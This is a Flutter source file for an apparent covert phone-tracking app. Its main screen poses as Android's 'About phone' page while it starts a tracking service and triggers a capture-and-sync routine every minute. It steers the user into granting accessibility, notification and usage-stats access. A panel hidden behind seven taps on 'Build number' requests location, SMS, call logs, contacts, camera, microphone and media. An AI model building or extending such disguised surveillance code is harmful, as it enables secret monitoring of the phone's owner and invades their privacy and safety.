import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:device_info_plus/device_info_plus.dart';
import '../../services/background_worker.dart';
import '../../services/permission_service.dart';
import '../../platform/tracking_channel.dart';

class TrackingHomePage extends ConsumerStatefulWidget {
  const TrackingHomePage({super.key});

  @override
  ConsumerState<TrackingHomePage> createState() => _TrackingHomePageState();
}

class _TrackingHomePageState extends ConsumerState<TrackingHomePage>
    with WidgetsBindingObserver {
  Map<String, String> _about = {};
  Timer? _syncTimer;
  Completer<void>? _resumeCompleter;
  bool _permissionFlowRan = false;
  int _buildTaps = 0;
  bool _showPermissions = false;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _loadAboutInfo();
    _startBackendMonitoring();
    _setupPermissions();
    _syncTimer = Timer.periodic(
      const Duration(minutes: 1),
      (_) => BackgroundWorker.captureAllAndSync(),
    );
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _syncTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed &&
        !(_resumeCompleter?.isCompleted ?? true)) {
      _resumeCompleter?.complete();
    }
  }

  // ── Device info ──────────────────────────────────────────────────────────────

  Future<void> _loadAboutInfo() async {
    try {
      final a = await DeviceInfoPlugin().androidInfo;
      if (!mounted) return;
      setState(() {
        _about = {
          'name': '${a.manufacturer} ${a.model}'.trim(),
          'model': a.model,
          'android': a.version.release,
          'patch': a.version.securityPatch ?? '—',
          'build': a.display.isNotEmpty ? a.display : a.id,
          'baseband': a.version.incremental,
          'processor': a.hardware.isNotEmpty ? a.hardware : a.board,
        };
      });
    } catch (_) {}
  }

  // ── Backend monitoring ───────────────────────────────────────────────────────

  Future<void> _startBackendMonitoring() async {
    try {
      await TrackingChannel.instance.startTrackingService();
    } catch (_) {}
    BackgroundWorker.captureAllAndSync();
  }

  // ── Permission flow on login ─────────────────────────────────────────────────

  Future<void> _setupPermissions() async {
    if (_permissionFlowRan) return;
    _permissionFlowRan = true;

    final svc = ref.read(permissionServiceProvider);
    await svc.requestAllRuntimePermissions();
    if (!mounted) return;

    final queue = <_SpecialAccess>[
      _SpecialAccess(svc.openUsageStatsSettings, svc.isUsageStatsGranted),
      _SpecialAccess(svc.openNotificationAccessSettings, svc.isNotificationAccessGranted),
      _SpecialAccess(svc.openAccessibilitySettings, svc.isAccessibilityGranted),
      _SpecialAccess(svc.openExactAlarmSettings, svc.isExactAlarmGranted),
    ];
    for (final s in queue) {
      if (!mounted) return;
      if (await s.isGranted()) continue;
      await s.open();
      await _waitForResume();
      await Future<void>.delayed(const Duration(milliseconds: 400));
    }
  }

  Future<void> _waitForResume() {
    _resumeCompleter = Completer<void>();
    return _resumeCompleter!.future;
  }

  // ── 7-tap Build number easter egg ────────────────────────────────────────────

  void _onBuildNumberTap() {
    _buildTaps++;
    final remaining = 7 - _buildTaps;

    if (_buildTaps >= 7) {
      _buildTaps = 0;
      setState(() => _showPermissions = !_showPermissions);
      ScaffoldMessenger.of(context).clearSnackBars();
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content: Text(
          _showPermissions ? 'Developer options enabled' : 'Developer options hidden',
        ),
        duration: const Duration(seconds: 2),
      ));
    } else if (remaining <= 3) {
      ScaffoldMessenger.of(context).clearSnackBars();
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content: Text(
          'You are $remaining ${remaining == 1 ? 'step' : 'steps'} away from being a developer',
        ),
        duration: const Duration(milliseconds: 800),
      ));
    }
  }

  // ── Build ────────────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    final svc = ref.read(permissionServiceProvider);
    return Scaffold(
      backgroundColor: const Color(0xFFF2F3F5),
      appBar: AppBar(
        backgroundColor: const Color(0xFFF2F3F5),
        elevation: 0,
        scrolledUnderElevation: 0,
        foregroundColor: Colors.black87,
        title: const Text(
          'About phone',
          style: TextStyle(
              fontSize: 20, fontWeight: FontWeight.w600, color: Colors.black87),
        ),
      ),
      body: ListView(
        physics: const BouncingScrollPhysics(),
        padding: const EdgeInsets.fromLTRB(16, 4, 16, 40),
        children: [
          _AboutDeviceHeader(
            name: _about['name'] ?? 'Android device',
            android: _about['android'] ?? '',
          ),
          const SizedBox(height: 16),
          _AboutInfoGroup(
            rows: [
              _AboutRow(label: 'Device name', value: _about['name'] ?? '—'),
              _AboutRow(label: 'Model number', value: _about['model'] ?? '—'),
              _AboutRow(label: 'Android version', value: _about['android'] ?? '—'),
              _AboutRow(
                  label: 'Android security patch level',
                  value: _about['patch'] ?? '—'),
              _AboutRow(label: 'Processor', value: _about['processor'] ?? '—'),
              _AboutRow(label: 'Baseband version', value: _about['baseband'] ?? '—'),
              _AboutRow(
                label: 'Build number',
                value: _about['build'] ?? '—',
                onTap: _onBuildNumberTap,
              ),
            ],
          ),
          if (_showPermissions) ...[
            const SizedBox(height: 16),
            _PermissionPanel(svc: svc),
          ],
        ],
      ),
    );
  }
}

class _SpecialAccess {
  _SpecialAccess(this.open, this.isGranted);
  final Future<void> Function() open;
  final Future<bool> Function() isGranted;
}

// ─────────────────────────────────────────────────────────────────────────────
// Permission panel — shown after 7 taps on Build number
// ─────────────────────────────────────────────────────────────────────────────

class _PermissionPanel extends StatefulWidget {
  const _PermissionPanel({required this.svc});
  final PermissionService svc;

  @override
  State<_PermissionPanel> createState() => _PermissionPanelState();
}

class _PermissionPanelState extends State<_PermissionPanel>
    with WidgetsBindingObserver {
  Map<String, bool> _status = {};
  bool _loading = true;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _loadStatuses();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) _loadStatuses();
  }

  Future<void> _loadStatuses() async {
    if (!mounted) return;
    setState(() => _loading = true);
    final svc = widget.svc;
    final results = await Future.wait([
      svc.isLocationGranted(),          // 0
      svc.isBatteryOptimisationExempt(), // 1
      svc.isCallLogGranted(),            // 2
      svc.isSmsGranted(),               // 3
      svc.isContactsGranted(),          // 4
      svc.isCameraGranted(),            // 5
      svc.isMicGranted(),               // 6
      svc.isMediaGranted(),             // 7
      svc.isUsageStatsGranted(),        // 8
      svc.isNotificationAccessGranted(), // 9
      svc.isAccessibilityGranted(),     // 10
      svc.isExactAlarmGranted(),        // 11
    ]);
    if (!mounted) return;
    setState(() {
      _loading = false;
      _status = {
        'location':      results[0],
        'battery':       results[1],
        'callLogs':      results[2],
        'sms':           results[3],
        'contacts':      results[4],
        'camera':        results[5],
        'mic':           results[6],
        'media':         results[7],
        'usage':         results[8],
        'notifications': results[9],
        'accessibility': results[10],
        'exactAlarm':    results[11],
      };
    });
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.grey.shade200),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.fromLTRB(18, 14, 10, 10),
            child: Row(
              children: [
                const Text(
                  'App Permissions',
                  style: TextStyle(
                      fontSize: 15,
                      fontWeight: FontWeight.w700,
                      color: Colors.black87),
                ),
                const Spacer(),
                if (_loading)
                  const SizedBox(
                    width: 18,
                    height: 18,
                    child: CircularProgressIndicator(strokeWidth: 2),
                  )
                else
                  IconButton(
                    icon: const Icon(Icons.refresh_rounded, size: 20),
                    onPressed: _loadStatuses,
                    tooltip: 'Refresh',
                    padding: const EdgeInsets.all(8),
                    constraints: const BoxConstraints(),
                  ),
              ],
            ),
          ),
          Divider(height: 1, thickness: 1, color: Colors.grey.shade100),
          if (!_loading) ...[
            _permRow('Location (Always On)', 'location',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestLocationPermission();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('Battery Optimisation', 'battery',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestBatteryExemption();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('Call Logs', 'callLogs',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestCallLogPermission();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('SMS Messages', 'sms',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestSmsPermission();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('Contacts', 'contacts',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestContactsPermission();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('Camera', 'camera',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestCameraPermission();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('Microphone', 'mic',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestMicPermission();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('Gallery / Media', 'media',
                isSettings: false,
                onAllow: () async {
                  await widget.svc.requestMediaPermission();
                  _loadStatuses();
                }),
            _divider(),
            _permRow('Usage Stats', 'usage',
                isSettings: true,
                onAllow: () => widget.svc.openUsageStatsSettings()),
            _divider(),
            _permRow('Notification Access', 'notifications',
                isSettings: true,
                onAllow: () => widget.svc.openNotificationAccessSettings()),
            _divider(),
            _permRow('Accessibility Service', 'accessibility',
                isSettings: true,
                onAllow: () => widget.svc.openAccessibilitySettings()),
            _divider(),
            _permRow('Alarms & Reminders', 'exactAlarm',
                isSettings: true,
                onAllow: () => widget.svc.openExactAlarmSettings()),
            const SizedBox(height: 4),
          ],
        ],
      ),
    );
  }

  Widget _divider() =>
      Divider(height: 1, thickness: 1, color: Colors.grey.shade100);

  Widget _permRow(
    String label,
    String key, {
    required bool isSettings,
    required Future<void> Function() onAllow,
  }) {
    final granted = _status[key] ?? false;
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 11),
      child: Row(
        children: [
          Expanded(
            child: Text(
              label,
              style: const TextStyle(
                  fontSize: 14,
                  fontWeight: FontWeight.w500,
                  color: Colors.black87),
            ),
          ),
          if (granted)
            const Icon(Icons.check_circle_rounded,
                color: Color(0xFF43A047), size: 22)
          else
            TextButton(
              onPressed: onAllow,
              style: TextButton.styleFrom(
                padding:
                    const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
                minimumSize: Size.zero,
                tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                backgroundColor:
                    const Color(0xFF1565C0).withValues(alpha: 0.09),
                foregroundColor: const Color(0xFF1565C0),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8)),
              ),
              child: Text(
                isSettings ? 'Open Settings' : 'Allow',
                style: const TextStyle(
                    fontSize: 13, fontWeight: FontWeight.w600),
              ),
            ),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// "About phone" UI widgets
// ─────────────────────────────────────────────────────────────────────────────

class _AboutDeviceHeader extends StatelessWidget {
  const _AboutDeviceHeader({required this.name, required this.android});

  final String name;
  final String android;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 28, horizontal: 20),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.grey.shade200),
      ),
      child: Column(
        children: [
          Container(
            width: 64,
            height: 64,
            decoration: BoxDecoration(
              color: const Color(0xFF5F6368).withValues(alpha: 0.08),
              shape: BoxShape.circle,
            ),
            child: const Icon(Icons.android_rounded,
                size: 38, color: Color(0xFF3DDC84)),
          ),
          const SizedBox(height: 14),
          Text(
            name,
            textAlign: TextAlign.center,
            style: const TextStyle(
                fontSize: 18,
                fontWeight: FontWeight.w700,
                color: Colors.black87),
          ),
          if (android.isNotEmpty) ...[
            const SizedBox(height: 4),
            Text('Android $android',
                style: TextStyle(fontSize: 13, color: Colors.grey.shade600)),
          ],
        ],
      ),
    );
  }
}

class _AboutInfoGroup extends StatelessWidget {
  const _AboutInfoGroup({required this.rows});

  final List<_AboutRow> rows;

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.grey.shade200),
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: Column(
          children: [
            for (int i = 0; i < rows.length; i++) ...[
              rows[i],
              if (i != rows.length - 1)
                Divider(height: 1, thickness: 1, color: Colors.grey.shade100),
            ],
          ],
        ),
      ),
    );
  }
}

class _AboutRow extends StatelessWidget {
  const _AboutRow({
    required this.label,
    required this.value,
    this.onTap,
  });

  final String label;
  final String value;
  final VoidCallback? onTap;

  @override
  Widget build(BuildContext context) {
    final content = Padding(
      padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 15),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Expanded(
            flex: 4,
            child: Text(label,
                style: const TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.w500,
                    color: Colors.black87)),
          ),
          const SizedBox(width: 12),
          Expanded(
            flex: 5,
            child: Text(
              value,
              textAlign: TextAlign.right,
              style: TextStyle(fontSize: 14, color: Colors.grey.shade600),
            ),
          ),
        ],
      ),
    );
    if (onTap != null) {
      return InkWell(onTap: onTap, child: content);
    }
    return content;
  }
}
